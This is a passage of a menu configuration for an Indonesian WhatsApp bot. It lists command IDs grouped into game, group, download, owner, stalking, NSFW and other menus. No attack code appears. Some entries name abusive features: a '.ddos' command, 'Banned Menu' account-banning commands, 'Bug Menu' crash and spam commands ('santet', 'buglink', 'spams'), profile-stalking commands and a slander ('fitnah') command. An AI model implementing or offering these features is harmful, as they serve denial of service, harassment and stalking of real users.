    { "header": "2gb", "title": "Fitur 2gb", "id": ".2gb" },
    { "header": "3gb", "title": "Fitur 3gb", "id": ".3gb" },
    { "header": "4gb", "title": "Fitur 4gb", "id": ".4gb" },
    { "header": "5gb", "title": "Fitur 5gb", "id": ".5gb" },
    { "header": "6gb", "title": "Fitur 6gb", "id": ".6gb" },
    { "header": "7gb", "title": "Fitur 7gb", "id": ".7gb" },
    { "header": "8gb", "title": "Fitur 8gb", "id": ".8gb" },
    { "header": "Unli", "title": "Fitur unli", "id": ".unli" }
]},
{
"title": "Rpg Menu ⚔️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Inventory", "title": "Fitur inventory", "id": ".inventory" },
    { "header": "Mining", "title": "Fitur mining", "id": ".mining" },
    { "header": "Buy", "title": "Fitur buy", "id": ".buy" },
    { "header": "Sell", "title": "Fitur sell", "id": ".sell" },
    { "header": "Heal", "title": "Fitur heal", "id": ".heal" },
    { "header": "Hunt", "title": "Fitur hunt", "id": ".hunt" },
    { "header": "Adventure", "title": "Fitur adventure", "id": ".adventure" },
    { "header": "Luckyday", "title": "Fitur luckyday", "id": ".luckyday" },
    { "header": "Killslime", "title": "Fitur killslime", "id": ".killslime" },
    { "header": "Killgoblin", "title": "Fitur killgoblin", "id": ".killgoblin" },
    { "header": "Killdevil", "title": "Fitur killdevil", "id": ".killdevil" },
    { "header": "Killbehemoth", "title": "Fitur killbehemoth", "id": ".killbehemoth" },
    { "header": "Killdemon", "title": "Fitur killdemon", "id": ".killdemon" },
    { "header": "Killdemonking", "title": "Fitur killdemonking", "id": ".killdemonking" },
    { "header": "Joinrpg", "title": "Fitur joinrpg", "id": ".joinrpg" },
    { "header": "Sellikan", "title": "Fitur sellikan", "id": ".sellikan" },
    { "header": "Sellbesi", "title": "Fitur sellbesi", "id": ".sellbesi" },
    { "header": "Sellemas", "title": "Fitur sellemas", "id": ".sellemas" },
    { "header": "Jelajah", "title": "Fitur jelajah", "id": ".jelajah" },
    { "header": "Mancing", "title": "Fitur mancing", "id": ".mancing" },
    { "header": "Jualikan", "title": "Fitur jualikan", "id": ".jualikan" },
    { "header": "Jualcoal", "title": "Fitur jualcoal", "id": ".jualcoal" },
    { "header": "Jualstone", "title": "Fitur jualstone", "id": ".jualstone" },
    { "header": "Jualingot", "title": "Fitur jualingot", "id": ".jualingot" },
    { "header": "Jualkayu", "title": "Fitur jualkayu", "id": ".jualkayu" },
    { "header": "Jualbahankimia", "title": "Fitur jualbahankimia", "id": ".jualbahankimia" },
    { "header": "Lebur", "title": "Fitur lebur", "id": ".lebur" },
    { "header": "Nebang", "title": "Fitur nebang", "id": ".nebang" },
    { "header": "Goplanet", "title": "Fitur goplanet", "id": ".goplanet" },
    { "header": "Ngojek", "title": "Fitur ngojek", "id": ".ngojek" }
]},
{
"title": "Game Menu 🎮", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Caklontong", "title": "Fitur caklontong", "id": ".caklontong" },
    { "header": "Tebakgambar", "title": "Fitur tebakgambar", "id": ".tebakgambar" },
    { "header": "Tebakgame", "title": "Fitur tebakgame", "id": ".tebakgame" },
    { "header": "Tebakkata", "title": "Fitur tebakkata", "id": ".tebakkata" },
    { "header": "Tebakbendera", "title": "Fitur tebakbendera", "id": ".tebakbendera" },
    { "header": "Tebakkalimat", "title": "Fitur tebakkalimat", "id": ".tebakkalimat" },
    { "header": "Tebaksiapa", "title": "Fitur tebaksiapa", "id": ".tebaksiapa" },
    { "header": "Tebakkimia", "title": "Fitur tebakkimia", "id": ".tebakkimia" },
    { "header": "Tebaklirik", "title": "Fitur tebaklirik", "id": ".tebaklirik" },
    { "header": "Tebaktebakan", "title": "Fitur tebaktebakan", "id": ".tebaktebakan" },
    { "header": "Tekateki", "title": "Fitur tekateki", "id": ".tekateki" },
    { "header": "Family100", "title": "Fitur family100", "id": ".family100" },
    { "header": "Susunkata", "title": "Fitur susunkata", "id": ".susunkata" },
    { "header": "Tictactoe", "title": "Fitur tictactoe", "id": ".tictactoe" },
    { "header": "Delttt", "title": "Fitur delttt", "id": ".delttt" },
    { "header": "Casino", "title": "Fitur casino", "id": ".casino" },
    { "header": "Delcasino", "title": "Fitur delcasino", "id": ".delcasino" }
]},
{
"title": "Group Menu 👥", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Autoaigc", "title": "Fitur autoaigc", "id": ".autoaigc" },
    { "header": "Afk", "title": "Fitur afk", "id": ".afk" },
    { "header": "Fitnah", "title": "Fitur fitnah", "id": ".fitnah" },
    { "header": "Intro", "title": "Fitur intro", "id": ".intro" },
    { "header": "Listonline", "title": "Fitur listonline", "id": ".listonline" },
    { "header": "Welcome", "title": "Fitur welcome", "id": ".welcome" },
    { "header": "Left", "title": "Fitur left", "id": ".left" },
    { "header": "Pppanjanggc", "title": "Fitur pppanjanggc", "id": ".pppanjanggc" },
    { "header": "Opentime", "title": "Fitur opentime", "id": ".opentime" },
    { "header": "Closetime", "title": "Fitur closetime", "id": ".closetime" },
    { "header": "Setopen", "title": "Fitur setopen", "id": ".setopen" },
    { "header": "Changesetopen", "title": "Fitur changesetopen", "id": ".changesetopen" },
    { "header": "Delsetopen", "title": "Fitur delsetopen", "id": ".delsetopen" },
    { "header": "Setclose", "title": "Fitur setclose", "id": ".setclose" },
    { "header": "Changesetclose", "title": "Fitur changesetclose", "id": ".changesetclose" },
    { "header": "Delsetclose", "title": "Fitur delsetclose", "id": ".delsetclose" },
    { "header": "Setwelcome", "title": "Fitur setwelcome", "id": ".setwelcome" },
    { "header": "Changewelcome", "title": "Fitur changewelcome", "id": ".changewelcome" },
    { "header": "Delsetwelcome", "title": "Fitur delsetwelcome", "id": ".delsetwelcome" },
    { "header": "Setleft", "title": "Fitur setleft", "id": ".setleft" },
    { "header": "Changeleft", "title": "Fitur changeleft", "id": ".changeleft" },
    { "header": "Delsetleft", "title": "Fitur delsetleft", "id": ".delsetleft" },
    { "header": "Linkgc", "title": "Fitur linkgc", "id": ".linkgc" },
    { "header": "Setppgc", "title": "Fitur setppgc", "id": ".setppgc" },
    { "header": "Setppgc2", "title": "Fitur setppgc2", "id": ".setppgc2" },
    { "header": "Setnamegc", "title": "Fitur setnamegc", "id": ".setnamegc" },
    { "header": "Setdesc", "title": "Fitur setdesc", "id": ".setdesc" },
    { "header": "Antilink", "title": "Fitur antilink", "id": ".antilink" },
    { "header": "Antilinktt", "title": "Fitur antilinktt", "id": ".antilinktt" },
    { "header": "Kickme", "title": "Fitur kickme", "id": ".kickme" },
    { "header": "Mute", "title": "Fitur mute", "id": ".mute" },
    { "header": "Open", "title": "Fitur open", "id": ".open" },
    { "header": "Close", "title": "Fitur close", "id": ".close" },
    { "header": "Add", "title": "Fitur add", "id": ".add" },
    { "header": "Kick", "title": "Fitur kick", "id": ".kick" },
    { "header": "Delete", "title": "Fitur delete", "id": ".delete" },
    { "header": "Promote", "title": "Fitur promote", "id": ".promote" },
    { "header": "Demote", "title": "Fitur demote", "id": ".demote" },
    { "header": "Revoke", "title": "Fitur revoke", "id": ".revoke" },
    { "header": "Hidetag", "title": "Fitur hidetag", "id": ".hidetag" },
    { "header": "Checksewa", "title": "Fitur checksewa", "id": ".checksewa" }
]

},
{
"title": "Download Menu  📥", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Play", "title": "Fitur play", "id": ".play" },
    { "header": "Ytmp3", "title": "Fitur ytmp3", "id": ".ytmp3" },
    { "header": "Ytmp4", "title": "Fitur ytmp4", "id": ".ytmp4" },
    { "header": "Ytv", "title": "Fitur ytv", "id": ".ytv" },
    { "header": "Ytv2", "title": "Fitur ytv2", "id": ".ytv2" },
    { "header": "Instagram", "title": "Fitur instagram", "id": ".instagram" },
    { "header": "Ig", "title": "Fitur ig", "id": ".ig" },
    { "header": "Ig2", "title": "Fitur ig2", "id": ".ig2" },
    { "header": "Ig3", "title": "Fitur ig3", "id": ".ig3" },
    { "header": "Igphoto", "title": "Fitur igphoto", "id": ".igphoto" },
    { "header": "Igvideo", "title": "Fitur igvideo", "id": ".igvideo" },
    { "header": "Igreels", "title": "Fitur igreels", "id": ".igreels" },
    { "header": "Twitter", "title": "Fitur twitter", "id": ".twitter" },
    { "header": "Tiktok", "title": "Fitur tiktok", "id": ".tiktok" },
    { "header": "Tiktoksearch", "title": "Fitur tiktoksearch", "id": ".tiktoksearch" },
    { "header": "Tiktokaudio", "title": "Fitur tiktokaudio", "id": ".tiktokaudio" },
    { "header": "Mediafire", "title": "Fitur mediafire", "id": ".mediafire" },
    { "header": "Gitclone", "title": "Fitur gitclone", "id": ".gitclone" },
    { "header": "Fbdl", "title": "Fitur fbdl", "id": ".fbdl" },
    { "header": "Fb2", "title": "Fitur fb2", "id": ".fb2" },
    { "header": "Fb3", "title": "Fitur fb3", "id": ".fb3" },
    { "header": "Fb4", "title": "Fitur fb4", "id": ".fb4" },
    { "header": "Gdrive", "title": "Fitur gdrive", "id": ".gdrive" }
]

},
{
"title": "Search Menu 🔍", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Lk21", "title": "Fitur lk21", "id": ".lk21" },
    { "header": "Jarak", "title": "Fitur jarak", "id": ".jarak" },
    { "header": "Google", "title": "Fitur google", "id": ".google" },
    { "header": "Googleimage", "title": "Fitur googleimage", "id": ".googleimage" },
    { "header": "Ytsearch", "title": "Fitur ytsearch", "id": ".ytsearch" },
    { "header": "Searchgrup", "title": "Fitur searchgrup", "id": ".searchgrup" },
    { "header": "Pinterest", "title": "Fitur pinterest", "id": ".pinterest" },
    { "header": "Lirik", "title": "Fitur lirik", "id": ".lirik" },
    { "header": "Shazam", "title": "Fitur shazam", "id": ".shazam" },
    { "header": "Carijudullagu", "title": "Fitur carijudullagu", "id": ".carijudullagu" },
    { "header": "Infogempa", "title": "Fitur infogempa", "id": ".infogempa" },
    { "header": "Infocuaca", "title": "Fitur infocuaca", "id": ".infocuaca" },
    { "header": "Komikusearch", "title": "Fitur komikusearch", "id": ".komikusearch" }
]

},
{
"title": "Random Menu 🔀", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Waifu", "title": "Fitur waifu", "id": ".waifu" },
    { "header": "Ppcp", "title": "Fitur ppcp", "id": ".ppcp" },
    { "header": "Cosplay", "title": "Fitur cosplay", "id": ".cosplay" },
    { "header": "Cecan", "title": "Fitur cecan", "id": ".cecan" },
    { "header": "Cogan", "title": "Fitur cogan", "id": ".cogan" },
    { "header": "Meme", "title": "Fitur meme", "id": ".meme" },
    { "header": "Memeindo", "title": "Fitur memeindo", "id": ".memeindo" },
    { "header": "Darkjokes", "title": "Fitur darkjokes", "id": ".darkjokes" }
]

},
{
"title": "Random Quotes 💬", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Quotesdilan", "title": "Fitur quotesdilan", "id": ".quotesdilan" },
    { "header": "Quotesbucin", "title": "Fitur quotesbucin", "id": ".quotesbucin" },
    { "header": "Quotesjawa", "title": "Fitur quotesjawa", "id": ".quotesjawa" },
    { "header": "Quotesanime", "title": "Fitur quotesanime", "id": ".quotesanime" },
    { "header": "Galau", "title": "Fitur galau", "id": ".galau" }
]

},
{
"title": "Cewek Asia Menu 👩", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Lisa", "title": "Fitur lisa", "id": ".lisa" },
    { "header": "Rose", "title": "Fitur rose", "id": ".rose" },
    { "header": "Jiso", "title": "Fitur jiso", "id": ".jiso" },
    { "header": "Jenny", "title": "Fitur jenny", "id": ".jenny" },
    { "header": "Indonesia", "title": "Fitur indonesia", "id": ".indonesia" },
    { "header": "Japan", "title": "Fitur japan", "id": ".japan" },
    { "header": "China", "title": "Fitur china", "id": ".china" },
    { "header": "Malaysia", "title": "Fitur malaysia", "id": ".malaysia" },
    { "header": "Vietnam", "title": "Fitur vietnam", "id": ".vietnam" },
    { "header": "Korea", "title": "Fitur korea", "id": ".korea" },
    { "header": "Thailand", "title": "Fitur thailand", "id": ".thailand" }
]

},
{
"title": "Cowok Asia Menu 👨", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Suga", "title": "Fitur suga", "id": ".suga" },
    { "header": "Wuyifan", "title": "Fitur wuyifan", "id": ".wuyifan" },
    { "header": "Parkchanyeol", "title": "Fitur parkchanyeol", "id": ".parkchanyeol" },
    { "header": "Ohsehun", "title": "Fitur ohsehun", "id": ".ohsehun" },
    { "header": "Luhan", "title": "Fitur luhan", "id": ".luhan" },
    { "header": "Kimtaehyung", "title": "Fitur kimtaehyung", "id": ".kimtaehyung" },
    { "header": "Kimsoek", "title": "Fitur kimsoek", "id": ".kimsoek" },
    { "header": "Kimnanjoon", "title": "Fitur kimnanjoon", "id": ".kimnanjoon" },
    { "header": "Kimjunmyeon", "title": "Fitur kimjunmyeon", "id": ".kimjunmyeon" },
    { "header": "Kimjong", "title": "Fitur kimjong", "id": ".kimjong" },
    { "header": "Kimjondae", "title": "Fitur kimjondae", "id": ".kimjondae" },
    { "header": "Jungkook", "title": "Fitur jungkook", "id": ".jungkook" },
    { "header": "Jimin", "title": "Fitur jimin", "id": ".jimin" },
    { "header": "Jhope", "title": "Fitur jhope", "id": ".jhope" },
    { "header": "Huangzitao", "title": "Fitur huangzitao", "id": ".huangzitao" },
    { "header": "Dohkyungsoo", "title": "Fitur dohkyungsoo", "id": ".dohkyungsoo" },
    { "header": "Baekhyung", "title": "Fitur baekhyung", "id": ".baekhyung" }
]

},
{
"title": "Balance Menu 📊", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Balance", "title": "Fitur balance", "id": ".balance" },
    { "header": "Limit", "title": "Fitur limit", "id": ".limit" },
    { "header": "Buylimit", "title": "Fitur buylimit", "id": ".buylimit" },
    { "header": "Buyglimit", "title": "Fitur buyglimit", "id": ".buyglimit" },
    { "header": "Transfer", "title": "Fitur transfer", "id": ".transfer" },
    { "header": "Toplocal", "title": "Fitur toplocal", "id": ".toplocal" },
    { "header": "Topglobal", "title": "Fitur topglobal", "id": ".topglobal" }
]

},
{
"title": "Owner Menu 👨‍💼", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Restart", "title": "Fitur restart", "id": ".restart" },
    { "header": "Shutdown", "title": "Fitur shutdown", "id": ".shutdown" },
    { "header": "Pushkontak", "title": "Fitur pushkontak", "id": ".pushkontak" },
    { "header": "Self", "title": "Fitur self", "id": ".self" },
    { "header": "Public", "title": "Fitur public", "id": ".public" },
    { "header": "Setppbot", "title": "Fitur setppbot", "id": ".setppbot" },
    { "header": "Setppbot2", "title": "Fitur setppbot2", "id": ".setppbot2" },
    { "header": "Listgc", "title": "Fitur listgc", "id": ".listgc" },
    { "header": "Creategc", "title": "Fitur creategc", "id": ".creategc" },
    { "header": "Joingc", "title": "Fitur joingc", "id": ".joingc" },
    { "header": "Leavegc", "title": "Fitur leavegc", "id": ".leavegc" },
    { "header": "Bcall", "title": "Fitur bcall", "id": ".bcall" },
    { "header": "Broadcast", "title": "Fitur broadcast", "id": ".broadcast" },
    { "header": "Bcimg", "title": "Fitur bcimg", "id": ".bcimg" },
    { "header": "Bcstik", "title": "Fitur bcstik", "id": ".bcstik" },
    { "header": "Bcvn", "title": "Fitur bcvn", "id": ".bcvn" },
    { "header": "Bcvideo", "title": "Fitur bcvideo", "id": ".bcvideo" },
    { "header": "Bcsewa", "title": "Fitur bcsewa", "id": ".bcsewa" },
    { "header": "Getdb", "title": "Fitur getdb", "id": ".getdb" },
    { "header": "Getcase", "title": "Fitur getcase", "id": ".getcase" },
    { "header": "Ddos", "title": "Fitur ddos", "id": ".ddos" },
    { "header": "Addowner", "title": "Fitur addowner", "id": ".addowner" },
    { "header": "Delowner", "title": "Fitur delowner", "id": ".delowner" },
    { "header": "Addpremium", "title": "Fitur addpremium", "id": ".addpremium" },
    { "header": "Delpremium", "title": "Fitur delpremium", "id": ".delpremium" },
    { "header": "Addsewa", "title": "Fitur addsewa", "id": ".addsewa" },
    { "header": "Delsewa", "title": "Fitur delsewa", "id": ".delsewa" },
    { "header": "Blok", "title": "Fitur blok", "id": ".blok" },
    { "header": "Unblok", "title": "Fitur unblok", "id": ".unblok" },
    { "header": "Listblok", "title": "Fitur listblok", "id": ".listblok" },
    { "header": "Autoaipc", "title": "Fitur autoaipc", "id": ".autoaipc" },
    { "header": "Autoread", "title": "Fitur autoread", "id": ".autoread" },
    { "header": "Autobio", "title": "Fitur autobio", "id": ".autobio" },
    { "header": "Antidelete", "title": "Fitur antidelete", "id": ".antidelete" },
    { "header": "Antiviewonce", "title": "Fitur antiviewonce", "id": ".antiviewonce" },
    { "header": "Autorespond", "title": "Fitur autorespond", "id": ".autorespond" },
    { "header": "Anticall", "title": "Fitur anticall", "id": ".anticall" },
    { "header": "Autoblok212", "title": "Fitur autoblok212", "id": ".autoblok212" },
    { "header": "Resetlimit", "title": "Fitur resetlimit", "id": ".resetlimit" }
]

},
{
"title": "Storage Menu  💾", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Addstik", "title": "Fitur addstik", "id": ".addstik" },
    { "header": "Addvn", "title": "Fitur addvn", "id": ".addvn" },
    { "header": "Addimg", "title": "Fitur addimg", "id": ".addimg" },
    { "header": "Addvid", "title": "Fitur addvid", "id": ".addvid" },
    { "header": "Liststik", "title": "Fitur liststik", "id": ".liststik" },
    { "header": "Listvn", "title": "Fitur listvn", "id": ".listvn" },
    { "header": "Listimg", "title": "Fitur listimg", "id": ".listimg" },
    { "header": "Listvid", "title": "Fitur listvid", "id": ".listvid" },
    { "header": "Sampah", "title": "Fitur sampah", "id": ".sampah" },
    { "header": "Delsampah", "title": "Fitur delsampah", "id": ".delsampah" },
    { "header": "Sampah2", "title": "Fitur sampah2", "id": ".sampah2" },
    { "header": "Delsampah2", "title": "Fitur delsampah2", "id": ".delsampah2" }
]

},
{
"title": "Asupan Menu🍽️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Asupan", "title": "Fitur asupan", "id": ".asupan" },
    { "header": "Bocil", "title": "Fitur bocil", "id": ".bocil" },
    { "header": "Santuy", "title": "Fitur santuy", "id": ".santuy" },
    { "header": "Ukhty", "title": "Fitur ukhty", "id": ".ukhty" },
    { "header": "Chika", "title": "Fitur chika", "id": ".chika" },
    { "header": "Delvira", "title": "Fitur delvira", "id": ".delvira" },
    { "header": "Ayu", "title": "Fitur ayu", "id": ".ayu" },
    { "header": "Bunga", "title": "Fitur bunga", "id": ".bunga" },
    { "header": "Aura", "title": "Fitur aura", "id": ".aura" },
    { "header": "Nisa", "title": "Fitur nisa", "id": ".nisa" },
    { "header": "Ziva", "title": "Fitur ziva", "id": ".ziva" },
    { "header": "Yana", "title": "Fitur yana", "id": ".yana" },
    { "header": "Viona", "title": "Fitur viona", "id": ".viona" },
    { "header": "Syania", "title": "Fitur syania", "id": ".syania" },
    { "header": "Riri", "title": "Fitur riri", "id": ".riri" },
    { "header": "Syifa", "title": "Fitur syifa", "id": ".syifa" },
    { "header": "Mama_gina", "title": "Fitur mama_gina", "id": ".mama_gina" },
    { "header": "Alcakenya", "title": "Fitur alcakenya", "id": ".alcakenya" },
    { "header": "Mangayutri", "title": "Fitur mangayutri", "id": ".mangayutri" },
    { "header": "Rikagusriani", "title": "Fitur rikagusriani", "id": ".rikagusriani" },
    { "header": "Geayubi", "title": "Fitur geayubi", "id": ".geayubi" },
    { "header": "Syifa", "title": "Fitur syifa", "id": ".syifa" }
]

},
{
"title": "Random Stiker 🎭", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Patrick", "title": "Fitur patrick", "id": ".patrick" },
    { "header": "Sponsbob", "title": "Fitur sponsbob", "id": ".sponsbob" },
    { "header": "Kawan-sponsbob", "title": "Fitur kawan-sponsbob", "id": ".kawan-sponsbob" },
    { "header": "Dino-kuning", "title": "Fitur dino-kuning", "id": ".dino-kuning" },
    { "header": "Manusia-lidi", "title": "Fitur manusia-lidi", "id": ".manusia-lidi" },
    { "header": "Popoci", "title": "Fitur popoci", "id": ".popoci" },
    { "header": "Awoawo", "title": "Fitur awoawo", "id": ".awoawo" },
    { "header": "Chat", "title": "Fitur chat", "id": ".chat" },
    { "header": "Dbfly", "title": "Fitur dbfly", "id": ".dbfly" },
    { "header": "Doge", "title": "Fitur doge", "id": ".doge" },
    { "header": "Gojosatoru", "title": "Fitur gojosatoru", "id": ".gojosatoru" },
    { "header": "Hope-boy", "title": "Fitur hope-boy", "id": ".hope-boy" },
    { "header": "Jisoo", "title": "Fitur jisoo", "id": ".jisoo" },
    { "header": "Kr-robot", "title": "Fitur kr-robot", "id": ".kr-robot" },
    { "header": "Kucing", "title": "Fitur kucing", "id": ".kucing" },
    { "header": "Lonte", "title": "Fitur lonte", "id": ".lonte" },
    { "header": "Menjamet", "title": "Fitur menjamet", "id": ".menjamet" },
    { "header": "Meow", "title": "Fitur meow", "id": ".meow" },
    { "header": "Nicholas", "title": "Fitur nicholas", "id": ".nicholas" },
    { "header": "Tyni", "title": "Fitur tyni", "id": ".tyni" }
]

},
{
"title": "Stalking Menu 👤", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Igstalk", "title": "Fitur igstalk", "id": ".igstalk" },
    { "header": "Mlstalk", "title": "Fitur mlstalk", "id": ".mlstalk" },
    { "header": "Ffstalk", "title": "Fitur ffstalk", "id": ".ffstalk" },
    { "header": "Wastalk", "title": "Fitur wastalk", "id": ".wastalk" }
]

},
{
"title": "Image Effect 🎨", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Toanime", "title": "Fitur toanime", "id": ".toanime" },
    { "header": "Tozombie", "title": "Fitur tozombie", "id": ".tozombie" },
    { "header": "Differentme", "title": "Fitur differentme", "id": ".differentme" },
    { "header": "Differentme2", "title": "Fitur differentme2", "id": ".differentme2" },
    { "header": "Aiscene", "title": "Fitur aiscene", "id": ".aiscene" },
    { "header": "Remini", "title": "Fitur remini", "id": ".remini" },
    { "header": "Hdr", "title": "Fitur hdr", "id": ".hdr" },
    { "header": "Wasted", "title": "Fitur wasted", "id": ".wasted" },
    { "header": "Beautiful", "title": "Fitur beautiful", "id": ".beautiful" },
    { "header": "Fire", "title": "Fitur fire", "id": ".fire" },
    { "header": "Wanted", "title": "Fitur wanted", "id": ".wanted" },
    { "header": "Rip", "title": "Fitur rip", "id": ".rip" },
    { "header": "Jail", "title": "Fitur jail", "id": ".jail" },
    { "header": "Triggered", "title": "Fitur triggered", "id": ".triggered" },
    { "header": "Brazzers", "title": "Fitur brazzers", "id": ".brazzers" },
    { "header": "Gay", "title": "Fitur gay", "id": ".gay" },
    { "header": "Postig", "title": "Fitur postig", "id": ".postig" }
]

},
{
"title": "Fun Menu 🎉", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Apakah", "title": "Fitur apakah", "id": ".apakah" },
    { "header": "Kapankah", "title": "Fitur kapankah", "id": ".kapankah" },
    { "header": "Bisakah", "title": "Fitur bisakah", "id": ".bisakah" },
    { "header": "Bagaimanakah", "title": "Fitur bagaimanakah", "id": ".bagaimanakah" },
    { "header": "Rate", "title": "Fitur rate", "id": ".rate" },
    { "header": "Gantengcek", "title": "Fitur gantengcek", "id": ".gantengcek" },
    { "header": "Cekganteng", "title": "Fitur cekganteng", "id": ".cekganteng" },
    { "header": "Cantikcek", "title": "Fitur cantikcek", "id": ".cantikcek" },
    { "header": "Cekcantik", "title": "Fitur cekcantik", "id": ".cekcantik" },
    { "header": "Sangecek", "title": "Fitur sangecek", "id": ".sangecek" },
    { "header": "Ceksange", "title": "Fitur ceksange", "id": ".ceksange" },
    { "header": "Gaycek", "title": "Fitur gaycek", "id": ".gaycek" },
    { "header": "Cekgay", "title": "Fitur cekgay", "id": ".cekgay" },
    { "header": "Lesbicek", "title": "Fitur lesbicek", "id": ".lesbicek" },
    { "header": "Ceklesbi", "title": "Fitur ceklesbi", "id": ".ceklesbi" },
    { "header": "Wangy", "title": "Fitur wangy", "id": ".wangy" }
]

},
{
"title": "Islam Menu ☪️", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Kisahnabi", "title": "Fitur kisahnabi", "id": ".kisahnabi" },
    { "header": "Asmaulhusna", "title": "Fitur asmaulhusna", "id": ".asmaulhusna" },
    { "header": "Listsurah", "title": "Fitur listsurah", "id": ".listsurah" },
    { "header": "Randomquran", "title": "Fitur randomquran", "id": ".randomquran" },
    { "header": "Randomquran2", "title": "Fitur randomquran2", "id": ".randomquran2" },
    { "header": "Quranaudio", "title": "Fitur quranaudio", "id": ".quranaudio" },
    { "header": "Alquranaudio", "title": "Fitur alquranaudio", "id": ".alquranaudio" }
]

},
{
"title": "Banned Menu 🚫", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Kenon", "title": "Fitur kenon", "id": ".kenon" },
    { "header": "Out", "title": "Fitur out", "id": ".out" },
    { "header": "Verif", "title": "Fitur verif", "id": ".verif" },
    { "header": "Bannedv1", "title": "Fitur bannedv1", "id": ".bannedv1" },
    { "header": "Bannedv2", "title": "Fitur bannedv2", "id": ".bannedv2" },
    { "header": "Bannedv3", "title": "Fitur bannedv3", "id": ".bannedv3" },
    { "header": "Bannedv4", "title": "Fitur bannedv4", "id": ".bannedv4" },
    { "header": "Bannedv5", "title": "Fitur bannedv5", "id": ".bannedv5" },
    { "header": "Bannedv6", "title": "Fitur bannedv6", "id": ".bannedv6" },
    { "header": "Unbannedv1", "title": "Fitur unbannedv1", "id": ".unbannedv1" },
    { "header": "Unbannedv2", "title": "Fitur unbannedv2", "id": ".unbannedv2" },
    { "header": "Unbannedv3", "title": "Fitur unbannedv3", "id": ".unbannedv3" },
    { "header": "Unbannedv4", "title": "Fitur unbannedv4", "id": ".unbannedv4" },
    { "header": "Unbannedv5", "title": "Fitur unbannedv5", "id": ".unbannedv5" }
]

},
{
"title": "Bug Menu 🐞", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Aira", "title": "Fitur aira", "id": ".aira" },
    { "header": "Santet", "title": "Fitur santet", "id": ".santet" },
    { "header": "Bugs", "title": "Fitur bugs", "id": ".bugs" },
    { "header": "Buglink", "title": "Fitur buglink", "id": ".buglink" },
    { "header": "Spams", "title": "Fitur spams", "id": ".spams" }
]

},
{
"title": "Nsfw Menu 🔞", 
"highlight_label": \"Powered By ${setting.ownerName}\", 
"rows": 
[
    { "header": "Baka", "title": "Fitur baka", "id": ".baka" },
    { "header": "Smug", "title": "Fitur smug", "id": ".smug" },
    { "header": "Neko SFW", "title": "Fitur neko_sfw", "id": ".neko_sfw" },
    { "header": "Hentai GIF", "title": "Fitur hentai_gif", "id": ".hentai_gif" },
    { "header": "Spank", "title": "Fitur spank", "id": ".spank" },
    { "header": "Blowjob", "title": "Fitur blowjob", "id": ".blowjob" },
    { "header": "Cumarts", "title": "Fitur cumarts", "id": ".cumarts" },
    { "header": "Ero Yuri", "title": "Fitur eroyuri", "id": ".eroyuri" },
    { "header": "Ero Neko", "title": "Fitur eroneko", "id": ".eroneko" },
    { "header": "Ero Kemonomimi", "title": "Fitur erokemonomimi", "id": ".erokemonomimi" },
    { "header": "Ero Kitsune", "title": "Fitur erokitsune", "id": ".erokitsune" },
    { "header": "Ero", "title": "Fitur ero", "id": ".ero" },
    { "header": "Feet", "title": "Fitur feet", "id": ".feet" },
    { "header": "Ero Feet", "title": "Fitur erofeet", "id": ".erofeet" },
    { "header": "Feet GIF", "title": "Fitur feetgif", "id": ".feetgif" },
    { "header": "Femdom", "title": "Fitur femdom", "id": ".femdom" },
    { "header": "Futanari", "title": "Fitur futanari", "id": ".futanari" },
    { "header": "Hentai", "title": "Fitur hentai", "id": ".hentai" },
    { "header": "Holoero", "title": "Fitur holoero", "id": ".holoero" },
    { "header": "Holo", "title": "Fitur holo", "id": ".holo" },
    { "header": "Keta", "title": "Fitur keta", "id": ".keta" },
    { "header": "Kitsune", "title": "Fitur kitsune", "id": ".kitsune" },
    { "header": "Kemonomimi", "title": "Fitur kemonomimi", "id": ".kemonomimi" },
    { "header": "Pussy Art", "title": "Fitur pussyart", "id": ".pussyart" },
    { "header": "Pussy Wank GIF", "title": "Fitur pussywankgif", "id": ".pussywankgif" },
    { "header": "Girl Solo", "title": "Fitur girl_solo", "id": ".girl_solo" },
    { "header": "Girl Solo GIF", "title": "Fitur girl_solo_gif", "id": ".girl_solo_gif" },
    { "header": "Tits", "title": "Fitur tits", "id": ".tits" },
    { "header": "Trap", "title": "Fitur trap", "id": ".trap" },
    { "header": "Yuri", "title": "Fitur yuri", "id": ".yuri" },
    { "header": "Avatar2", "title": "Fitur avatar2", "id": ".avatar2" },
    { "header": "Anal", "title": "Fitur anal", "id": ".anal" },
    { "header": "BJ", "title": "Fitur bj", "id": ".bj" },
    { "header": "Classic", "title": "Fitur classic", "id": ".classic" },
    { "header": "Cumsluts", "title": "Fitur cumsluts", "id": ".cumsluts" },
    { "header": "Kuni", "title": "Fitur kuni", "id": ".kuni" },
    { "header": "Lesbian", "title": "Fitur lesbian", "id": ".lesbian" },
    { "header": "Neko", "title": "Fitur neko", "id": ".neko" },
    { "header": "Neko GIF", "title": "Fitur neko_gif", "id": ".neko_gif" },
    { "header": "Ahegao", "title": "Fitur ahegao", "id": ".ahegao" },
    { "header": "BDSM", "title": "Fitur bdsm", "id": ".bdsm" },
